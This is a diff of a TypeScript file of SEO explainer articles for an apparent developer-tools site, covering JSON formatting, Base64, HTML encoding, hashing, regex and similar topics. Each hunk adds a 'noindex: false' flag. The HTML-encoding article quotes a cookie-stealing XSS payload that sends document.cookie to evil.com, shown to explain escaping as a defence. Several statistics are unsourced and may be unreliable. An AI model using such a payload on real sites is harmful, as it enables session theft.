@@ -74,7 +74,7 @@ export const CLUSTER_13_ARTICLES: ContentPiece[] = [
         }
       ]
     },
-    sections: [
+    noindex: false,    sections: [
       {
         heading: "What Is JSON and Why Does Formatting Matter?",
         body: "JSON (JavaScript Object Notation) is a lightweight data interchange format used extensively in web APIs, configuration files, databases, and data serialization. According to the 2023 Stack Overflow Developer Survey, over 65% of professional developers work with JSON at least weekly. JSON's structure consists of key-value pairs enclosed in curly braces and ordered lists enclosed in square brackets. A well-formatted JSON document uses consistent indentation (2 or 4 spaces per level), places each key-value pair on its own line, and visually aligns nested structures. Formatting transforms a single-line 2 KB blob of data into a readable hierarchical document. Without formatting, a JSON response from an API like `{\"users\":[{\"id\":1,\"name\":\"Alice\"},{\"id\":2,\"name\":\"Bob\"}]}` is technically valid but impossible to scan visually. Proper formatting reveals the structure at a glance, making it easier to spot missing commas, unbalanced brackets, and incorrect nesting."
@@ -177,7 +177,7 @@ export const CLUSTER_13_ARTICLES: ContentPiece[] = [
         }
       ]
     },
-    sections: [
+    noindex: false,    sections: [
       {
         heading: "What Is Base64 and Why Does It Exist?",
         body: "Base64 is a binary-to-text encoding scheme that represents binary data in an ASCII string format. It was originally designed for MIME (Multipurpose Internet Mail Extensions) to transmit binary data via email protocols that only handle text. The name comes from the 64-character alphabet used: A-Z, a-z, 0-9, plus '+' and '/' (62 printable characters) with '=' for padding. Base64 is essential because many transport protocols, data formats (JSON, XML), and systems are text-based. They cannot directly carry raw bytes, especially control characters below ASCII 32 or values above 127. Base64 maps any binary data — images, audio, encrypted blobs, compiled code — into safe, printable ASCII characters. According to HTTP Archive, over 75% of websites use Base64-encoded data URIs to embed small images directly in CSS and HTML, eliminating HTTP requests at the cost of ~33% increased size. JWT (JSON Web Tokens), the standard for API authentication used by over 70% of OAuth 2.0 implementations, relies on Base64URL encoding for its three dot-separated segments."
@@ -280,7 +280,7 @@ export const CLUSTER_13_ARTICLES: ContentPiece[] = [
         }
       ]
     },
-    sections: [
+    noindex: false,    sections: [
       {
         heading: "What Is HTML Encoding and Why Does It Prevent XSS?",
         body: "HTML encoding (also called HTML escaping) transforms special characters that have meaning in HTML markup into their corresponding character entity references. The angle brackets `<` and `>` become `&lt;` and `&gt;`, so the browser renders them as literal characters instead of interpreting them as HTML tags. This is the foundation of defense against Cross-Site Scripting (XSS) attacks, which the OWASP Top 10 has consistently ranked among the most critical web application security risks. An XSS attack occurs when an attacker injects malicious JavaScript into a web page through untrusted input. For example, a comment field that outputs `User posted: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>` would execute the script. With HTML encoding applied, the output is `User posted: &lt;script&gt;document.location='https://evil.com/steal?cookie='+document.cookie&lt;/script&gt;`, which displays safely as text. According to HackerOne's 2023 report, XSS accounted for 28% of all reported vulnerabilities. Properly encoding output is the single most effective mitigation."
@@ -383,7 +383,7 @@ export const CLUSTER_13_ARTICLES: ContentPiece[] = [
         }
       ]
     },
-    sections: [
+    noindex: false,    sections: [
       {
         heading: "What Is Minification and How Does It Work?",
         body: "Minification is the process of removing all unnecessary characters from source code without altering its functionality. For CSS, this means stripping whitespace, comments, and newlines, and shortening hex color codes where possible. For JavaScript, minification goes further: it renames local variables and functions to single-character names, removes dead code (dead code elimination), inlines simple expressions, and optimizes conditional statements. A typical unminified JavaScript file with readable code — indented with descriptive variable names like `let totalUserCount = fetchUserData();` — becomes `let a=fetchUserData();` after minification. The terser the output, the more aggressive the minifier. Industry-standard tools like Terser (successor to UglifyJS) can reduce JavaScript bundle sizes by 50-70% on average. For CSS, cssnano achieves 30-50% reduction. The HTTP Archive reports that the median website in 2026 serves ~450 KB of JavaScript and ~80 KB of CSS. Minification alone can save 200-300 KB of transfer per page load. When combined with HTTP compression (gzip or brotli), the savings compound: minified files compress better because repetitive patterns are removed, reducing gzip dictionary size."
@@ -490,7 +490,7 @@ export const CLUSTER_13_ARTICLES: ContentPiece[] = [
         }
       ]
     },
-    sections: [
+    noindex: false,    sections: [
       {
         heading: "Why Formatting SQL Matters for Maintainability",
         body: "SQL is one of the most widely used languages in software development, yet it is often written as an unformatted single line or with haphazard indentation. A well-formatted SQL query is like well-formatted code in any language — it communicates intent, reduces cognitive load, and makes debugging faster. Consider the difference between `SELECT u.id,u.name,o.total FROM users u JOIN orders o ON u.id=o.user_id WHERE o.total>100 ORDER BY o.total DESC;` and its formatted version with each clause on its own line, JOINs indented, and aliases visible. Studies in software engineering show that developers spend 60% of their time reading code, not writing it. The same applies to SQL. A query that takes 30 seconds to read unformatted might take 5 seconds when formatted. Over a team of 10 developers reading queries daily, that time savings adds up to hours per week. Formatted SQL also reduces the risk of subtle bugs: a missing comma between column names, a misplaced WHERE clause that filters before a JOIN when you intended it to filter after, or an unclosed parenthesis that causes a syntax error at runtime."
@@ -593,7 +593,7 @@ export const CLUSTER_13_ARTICLES: ContentPiece[] = [
         }
       ]
     },
-    sections: [
+    noindex: false,    sections: [
       {
         heading: "What Is Hashing? One-Way Functions and Fixed Outputs",
         body: "A cryptographic hash function takes an input (or message) of arbitrary length and produces a fixed-size output, called a digest or hash. The output is deterministic — the same input always produces the same hash. The critical properties of a secure hash function are: preimage resistance (given a hash, it is computationally infeasible to find any input that produces it), second preimage resistance (given an input and its hash, it is infeasible to find a different input with the same hash), and collision resistance (it is infeasible to find any two different inputs that produce the same hash). Hash functions are not encryption — there is no decryption algorithm. You cannot recover the original data from a hash, which makes hashing ideal for password storage and integrity verification. The output size varies by algorithm: MD5 produces 128 bits (32 hex characters), SHA-1 produces 160 bits (40 hex characters), SHA-256 produces 256 bits (64 hex characters), and SHA-512 produces 512 bits (128 hex characters). Hashing the same 1 GB video file or the single letter 'A' through SHA-256 always produces exactly 64 hex characters."
@@ -700,7 +700,7 @@ export const CLUSTER_13_ARTICLES: ContentPiece[] = [
         }
       ]
     },
-    sections: [
+    noindex: false,    sections: [
       {
         heading: "What Is API Testing and Why It Matters",
         body: "API testing is the process of sending requests to an API endpoint and verifying the responses. It ensures that APIs function correctly, handle edge cases, enforce security, and perform within acceptable thresholds. In modern software architecture, APIs are the backbone connecting frontend applications, mobile apps, third-party integrations, and microservices. A broken API can cascade failures across an entire system. According to Postman's 2023 State of the API Report, 74% of developers use APIs more than they did the previous year, and 67% report that API reliability is their top concern. API testing catches: incorrect status codes (a 500 instead of 200), malformed response bodies (missing fields, wrong data types), authentication bypasses, rate limiting failures, performance regressions, and contract violations. An API tester tool lets you interact with APIs without writing code — you configure requests through a GUI and inspect responses in real time. This is ideal for exploratory testing, debugging during development, and documenting API behavior for team members. The ToolVerse API Tester provides a full-featured HTTP client in the browser with no installation required."
@@ -803,7 +803,7 @@ export const CLUSTER_13_ARTICLES: ContentPiece[] = [
         }
       ]
     },
-    sections: [
+    noindex: false,    sections: [
       {
         heading: "Why a Good README Matters: First Impression, Adoption, Contributions",
         body: "Your README is the first thing anyone sees when they visit your repository. GitHub statistics show that repositories with a README file receive 2x more stars and 3x more contributions than those without. A study of over 100,000 GitHub projects found that README quality is the strongest predictor of repository success — more than commit frequency, number of contributors, or star count. The README serves three critical audiences. (1) Users: Someone evaluating whether to use your library or tool. They need a clear description of what it does, installation instructions, and a quick example to get started. If they cannot figure this out in 30 seconds, they will leave. (2) Contributors: Developers considering contributing to your open-source project. They need contribution guidelines, code of conduct, local development setup instructions, and testing procedures. (3) Future you: Six months later when you return to the project, you will thank yourself for documenting the setup process, API, and architectural decisions. A well-crafted README signals that the project is maintained, professional, and worth investing time in."
@@ -906,7 +906,7 @@ export const CLUSTER_13_ARTICLES: ContentPiece[] = [
         }
       ]
     },
-    sections: [
+    noindex: false,    sections: [
       {
         heading: "What Is Regex and Common Use Cases",
         body: "A regular expression (regex or regexp) is a sequence of characters that defines a search pattern. Regex is used for string pattern matching in virtually every programming language, text editor, and command-line tool. Common use cases span the entire development workflow. Validation: ensuring email addresses, phone numbers, URLs, and passwords meet format requirements. Search: finding all occurrences of a pattern in log files, source code, or documents. Replace: globally renaming variables, reformatting date strings, or redacting sensitive information. Extraction: pulling specific parts of text like all URLs from an HTML page, hashtags from social media posts, or IP addresses from server logs. Syntax highlighting: text editors use regex to colorize keywords, strings, and comments in source code. According to GitHub's 2023 Octoverse report, regex patterns appear in approximately 15% of all open-source repositories. Learning regex is a multiplier skill — once you master it, you can perform text processing in minutes that would otherwise take hours of manual effort or hundreds of lines of code."
@@ -1013,7 +1013,7 @@ export const CLUSTER_13_ARTICLES: ContentPiece[] = [
         }
       ]
     },
-    sections: [
+    noindex: false,    sections: [
       {
         heading: "Color Theory Basics: Primary, Secondary, Tertiary Colors, Warm vs Cool",
         body: "Understanding color theory is the foundation of creating effective palettes. The color wheel organizes colors by their relationships. Primary colors (red, yellow, blue) cannot be created by mixing other colors — they are the source of all other colors. Secondary colors (orange, green, purple) are created by mixing two primaries: red + yellow = orange, yellow + blue = green, blue + red = purple. Tertiary colors (red-orange, yellow-orange, yellow-green, blue-green, blue-purple, red-purple) mix a primary with an adjacent secondary. Colors are also classified as warm or cool. Warm colors (reds, oranges, yellows) advance visually — they feel energetic, passionate, and attention-grabbing. Cool colors (blues, greens, purples) recede — they feel calm, professional, and trustworthy. This psychological distinction is critical in web design. A call-to-action button in a warm color (like #FF6B35 orange) on a cool-colored background (#1A365D navy blue) draws the eye because warm colors appear closer. Studies by the Pantone Color Institute show that color increases brand recognition by up to 80%. The color wheel has 12 hues at 30-degree intervals, but digital tools support 360 degrees of hue, giving web designers precise control over color selection."
